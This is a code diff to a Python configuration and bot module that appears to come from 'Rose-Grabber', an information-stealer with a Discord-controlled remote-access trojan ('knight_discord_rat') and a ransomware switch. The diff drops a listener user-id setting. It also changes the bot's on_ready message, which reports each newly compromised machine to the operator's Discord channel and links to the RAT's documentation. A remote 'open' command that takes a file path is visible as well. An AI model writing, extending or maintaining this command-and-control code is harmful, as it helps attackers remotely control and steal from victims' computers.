@@ -71,7 +71,6 @@ class Config:
         self.knight_discord_rat = False
         self.knight_discord_rat_bot_token = 'KNIGHT_DISCORD_RAT_BOT_TOKEN'
         self.knight_discord_rat_channel_id = 'KNIGHT_DISCORD_RAT_CHANNEL_ID'
-        self.knight_discord_rat_listener_user_id = 'KNIGHT_DISCORD_RAT_LISTENER_USER_ID'
         self.knight_discord_rat_prefix = 'KNIGHT_DISCORD_RAT_PREFIX'
 
         self.ransomware = False
@@ -160,9 +159,6 @@ class Config:
     
     def get_knight_discord_rat_channel_id(self):
         return self.knight_discord_rat_channel_id
-    
-    def get_knight_discord_rat_listener_user_id(self):
-        return self.knight_discord_rat_listener_user_id
     
     def get_knight_discord_rat_prefix(self):
         return self.knight_discord_rat_prefix
@@ -2096,7 +2092,6 @@ def Trigger():
 
 btoken = cc.get_knight_discord_rat_bot_token()
 prefix = cc.get_knight_discord_rat_prefix()
-userid = cc.get_knight_discord_rat_listener_user_id()
 channelid = cc.get_knight_discord_rat_channel_id()
 
 dscrd = 'https://discord.gg/sMawrDqnta'
@@ -2118,12 +2113,12 @@ if channelid == '':
 else:
     @bot.event
     async def on_ready():
-        usrmention = f'<@{userid}>'
         channel = bot.get_channel(int(channelid))
-        if userid == '':
-            await channel.send(f"New client online: process {clientid}")
+        docs = "https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/KNIGHT.md"
+        if cc.get_discord_ping():
+            await channel.send(f"@here | New client online: process {clientid}, refer to [documentation]({docs}) for help")
         else:
-            await channel.send(f"{usrmention} | New client online: process {clientid}")
+            await channel.send(f"New client online: process {clientid}, refer to [documentation]({docs}) for help")
 
 @bot.command(name='open')
 async def openf(ctx, inputid, fpath):
